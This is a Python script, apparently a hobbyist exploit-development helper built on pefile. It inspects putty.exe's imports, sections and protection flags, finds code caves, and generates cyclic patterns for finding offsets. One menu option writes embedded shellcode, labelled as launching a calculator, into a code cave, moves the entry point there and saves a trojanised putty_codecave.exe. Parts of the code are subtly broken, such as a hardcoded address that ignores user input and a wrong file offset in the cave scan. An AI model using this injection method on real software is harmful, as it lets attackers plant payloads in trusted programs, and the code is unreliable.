import pefile 
import os
import re 
import random

#calculator shellcode 
shellcode = ("\xbb\x83\xb3\x46\x48\xdd\xc3\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x31\x31\x58\x13\x83\xc0\x04\x03\x58\x8c\x51\xb3\xb4\x7a\x17"
"\x3c\x45\x7a\x78\xb4\xa0\x4b\xb8\xa2\xa1\xfb\x08\xa0\xe4\xf7"
"\xe3\xe4\x1c\x8c\x86\x20\x12\x25\x2c\x17\x1d\xb6\x1d\x6b\x3c"
"\x34\x5c\xb8\x9e\x05\xaf\xcd\xdf\x42\xd2\x3c\x8d\x1b\x98\x93"
"\x22\x28\xd4\x2f\xc8\x62\xf8\x37\x2d\x32\xfb\x16\xe0\x49\xa2"
"\xb8\x02\x9e\xde\xf0\x1c\xc3\xdb\x4b\x96\x37\x97\x4d\x7e\x06"
"\x58\xe1\xbf\xa7\xab\xfb\xf8\x0f\x54\x8e\xf0\x6c\xe9\x89\xc6"
"\x0f\x35\x1f\xdd\xb7\xbe\x87\x39\x46\x12\x51\xc9\x44\xdf\x15"
"\x95\x48\xde\xfa\xad\x74\x6b\xfd\x61\xfd\x2f\xda\xa5\xa6\xf4"
"\x43\xff\x02\x5a\x7b\x1f\xed\x03\xd9\x6b\x03\x57\x50\x36\x49"
"\xa6\xe6\x4c\x3f\xa8\xf8\x4e\x6f\xc1\xc9\xc5\xe0\x96\xd5\x0f"
"\x45\x68\x9c\x12\xef\xe1\x79\xc7\xb2\x6f\x7a\x3d\xf0\x89\xf9"
"\xb4\x88\x6d\xe1\xbc\x8d\x2a\xa5\x2d\xff\x23\x40\x52\xac\x44"
"\x41\x31\x33\xd7\x09\x98\xd6\x5f\xab\xe4")




def find_path_dll(dll,path):
    for root, dirs,files in os.walk(path):
        for i in files:
            if re.findall(dll,i,flags=re.IGNORECASE):
                return os.path.join(root,dll)


pe = pefile.PE('./putty.exe')
headers = ['DOS_HEADER','NT_HEADERS','FILE_HEADER','OPTIONAL_HEADER']

magic_number = pe.DOS_HEADER.e_magic
signature = pe.NT_HEADERS.Signature

print("Validating the whether its PE file or not ...")
if hex(magic_number) == '0x5a4d' and hex(signature) == '0x4550':
    print("Valid File")
else:
    print("Invalid File")


choice = int(input("""Enter your choice 
    1.List all imported DLL's 
    2.List all functions from a DLL
    3.List all functions from all DLL's
    4.List Number of Sections
    5.List All Sections in PE File
    6.List Security Mechanisms like ASLR , SEH NX etc
    7.Find Codecaves in PE File
    8.Write Shellcode at one of Codecave (may not work )
    9.Create a simple unique pattern  
    10.Search in that pattern
    100. to quit 
"""))

while choice!=100:
    if choice == 1:
        for i in pe.DIRECTORY_ENTRY_IMPORT:
            #print("\t%s at 0x%08x" % (i.name.decode('utf-8'), i.address))
            print(i.dll.decode('utf-8'))
    
    if choice==2:
        name = input("Enter dll name to search ")
        for i in pe.DIRECTORY_ENTRY_IMPORT:
            dll_name = i.dll.decode('utf-8')
            for j in i.imports:
                if dll_name == name:
                    print("\t%s at 0x%08x" % (j.name.decode('utf-8'), j.address))

    if choice==3:
        for i in pe.DIRECTORY_ENTRY_IMPORT:
            print(i.dll.decode('utf-8'))
            for j in i.imports:
                print("\t%s at 0x%08x" % (j.name.decode('utf-8'), j.address))
                
    if choice==4:
        print(pe.FILE_HEADER.NumberOfSections)

    if choice==5:
        for i in pe.sections:
            print(i)

    if choice==6:
        print("ASLR\t\tDEP\t\tSafeSEH\t\tControlFlowGuard\t\tHighEntropyVA")
        for j in pe.DIRECTORY_ENTRY_IMPORT:
            
            try:
                dll_name = j.dll.decode('utf-8')
                #print(dll_name)
                dll_path = find_path_dll(dll_name,'C:\\Windows\\System32')
                #print(dll_path)
                dll = pefile.PE(dll_path)

                print(str(dll.OPTIONAL_HEADER.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)+'\t\t',end='')
                print(str(dll.OPTIONAL_HEADER.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)+'\t\t',end='')
                print(str(dll.OPTIONAL_HEADER.IMAGE_DLLCHARACTERISTICS_NO_SEH)+'\t\t',end='')
                print(str(dll.OPTIONAL_HEADER.IMAGE_DLLCHARACTERISTICS_GUARD_CF)+'\t\t',end='')
                print(str(dll.OPTIONAL_HEADER.IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA)+'\t\t',end='')
                print(dll_name)
            except:
                pass
    if choice == 8:
        addr = input("Enter codecave address")
        #   0x00483C72
        addr = int('0x00483C72',16)
        old_entrypoint = pe.OPTIONAL_HEADER.AddressOfEntryPoint
        new_entrypoint = addr
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = 0x00483C72
        shellcode = shellcode.encode('raw_unicode_escape')
        pe.set_bytes_at_offset(addr,shellcode)
        pe.write('./putty_codecave.exe')
        pe.close()


    if choice == 7:
        f = open('./putty.exe','rb')
        
        for i in pe.sections:
            if i.SizeOfRawData!=0:
                f.seek(i.SizeOfRawData,0)
                data = f.read(i.SizeOfRawData)
                position = 0
                count = 0
                for every_byte in data:
                    #print(every_byte)
                    temp = hex(every_byte)
                    position += 1
                    #0x00483C72
                    if temp == '0x0':

                        count+=1
                    else:
                        if count >=500:
                            #print("code cave found")
                            raw_address = i.SizeOfRawData + position - count - 1
                            virtual_address = i.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase + position - count - 1
                            print("code cave found in %s\t size : %d bytes \t raw address : 0x%08X \t virtual address : 0x%08X "%(i.Name.decode('utf-8'),count,raw_address,virtual_address))
                            count = 0
        pe.close()
        f.close()

    if choice==9:
        data = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',\
        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',\
        '1','2','3','4','5','6','7','8','9','0']


        length = int(input("enter length of the pattern size "))

        pattern = ''

        for i in range(length):
            pattern += data[random.randint(0,61)]
        #print("pattern generated")
        print(pattern)

    if choice==10:
        
        item = input("enter string to find offset ")

        #index1 = pattern.find(item)
        indexes = [] 

        item_length = len(item)

        for i in range(0,len(pattern)):
            temp = pattern[i:i+item_length]
            if temp == item:
                indexes.append(i)

        for every in indexes:
            print(every+1)


    choice = int(input("""Enter your choice 
    1.List all imported DLL's 
    2.List all functions from a DLL
    3.List all functions from all DLL's
    4.List Number of Sections
    5.List All Sections in PE File
    6.List Security Mechanisms like ASLR , SEH NX etc
    7.Find Codecaves in PE File
    8.Write Shellcode at one of Codecave (may not work )
    9.Create a simple unique pattern  
    10.Search in that pattern
    100. to quit 
"""))
